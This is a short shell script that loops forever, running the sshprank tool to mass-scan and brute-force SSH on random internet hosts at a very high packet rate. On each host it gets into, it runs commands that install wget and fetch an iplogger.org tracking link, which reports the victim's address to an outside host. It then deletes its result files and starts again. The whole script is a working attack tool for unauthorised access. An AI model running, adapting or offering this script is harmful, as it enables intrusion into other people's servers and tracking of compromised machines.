while [ 1 != 0 ]
do
sudo python3 sshprank.py -m '-p22 --rate=1000000' -r 10000 -e -c 'apt update || yum update -y; sudo apt update; apt install wget -y || yum instal wget -y; sudo apt install wget -y; wget https://iplogger.org/1UPF67' -x 500 -S 500 -X 500
rm sshds.txt owned.txt
done
